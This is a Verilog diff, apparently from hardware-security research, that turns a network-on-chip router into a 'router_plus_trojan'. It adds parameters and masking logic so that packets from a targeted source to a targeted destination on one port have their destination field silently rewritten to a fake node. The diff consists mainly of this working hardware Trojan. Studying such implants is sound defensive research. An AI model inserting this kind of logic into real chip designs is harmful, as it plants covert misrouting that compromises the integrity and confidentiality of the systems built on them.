@@ -10,8 +10,13 @@ module router_plus_trojan #(parameter 	RT_ALG = 0, 	ID_BITS = 4,
 								SOURCE_BITS = 4,
 								BUFFER_DEPTH_BITS = 1,  //CHANGED FROM 1 TO 4**MUBASHIR
 								TYPE_BITS = 2,	ROW = 4, COLOUMN = 4, 
-								APP_ID_BITS = 3, N_ROUTER = 4) 
-(
+								APP_ID_BITS = 3, N_ROUTER = 4,
+								//Added Trojan parameters on 1st April, 2015 by Mubashir 
+								// If no parameters are sent from mesh then default values
+								// are (TROJAN_FAKE_DEST = 12,TROJAN_TARGET_SRC = 4, TROJAN_TARGET_DEST = 14,
+								// and TROJAN_PORT = 1 )
+								TROJAN_FAKE_DEST = 4'b1100,
+								TROJAN_TARGET_SRC = 4, TROJAN_TARGET_DEST = 14,TROJAN_PORT = 1) (
   
 	ON, clk, 
 	reset,  
@@ -31,6 +36,11 @@ module router_plus_trojan #(parameter 	RT_ALG = 0, 	ID_BITS = 4,
 	active /* Power */
  
 );
+	//*******************************Trojan Parameter on 1st April, 2015 by Mubashir*****************
+	localparam TROJAN_FAKE_DEST_MASK = {4'b0000,TROJAN_FAKE_DEST,2'b00,32'h0000_0000};
+	 //42 is Flit_WIDTH {s_flits_in & CLR_DEST_MASK --> Clear destination bits only}
+	localparam TROJAN_CLR_DEST_MASK  = {4'b1111,4'b0000,2'b11,32'hFFFF_FFFF};  
+	//////////////////////////////////////////////////////////////////////////////////////////////////
 	//define the log2 function
 	function integer log2;
 		input integer num;
@@ -64,7 +74,7 @@ module router_plus_trojan #(parameter 	RT_ALG = 0, 	ID_BITS = 4,
 	//Number of bits to represent coordinates. 
 	localparam ROW_BITS 	= log2(ROW); 
   	localparam COLUMN_BITS 	= log2(COLOUMN);
-
+	
     // Create Row Coloumn Address 
 	function [ID_BITS:0] grid_id;
 		input integer id; 
@@ -326,7 +336,12 @@ generate
 	end
 
 	for (i= CORE_IN_PORTS; i< IN_PORTS; i=i+1) begin : CN5 
-		assign in_data[i]  = 42'h030_0000_0000 | (42'h3C0_FFFF_FFFF & s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: FLIT_WIDTH]); //send packet to 12 node 
+		assign in_data[i]  = (i == TROJAN_PORT && 
+		                      s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: 4] == TROJAN_TARGET_SRC && 
+		                      s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH)-4)-1) -: 4] == TROJAN_TARGET_DEST)?
+		                      TROJAN_FAKE_DEST_MASK | (TROJAN_CLR_DEST_MASK &
+		                                               s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: FLIT_WIDTH])
+		                      :s_flits_in[((((i- CORE_IN_PORTS) + 1) *(FLIT_WIDTH))-1) -: FLIT_WIDTH];
 		assign in_valid[i] = s_valid_in[i- CORE_IN_PORTS];
 	end 
 
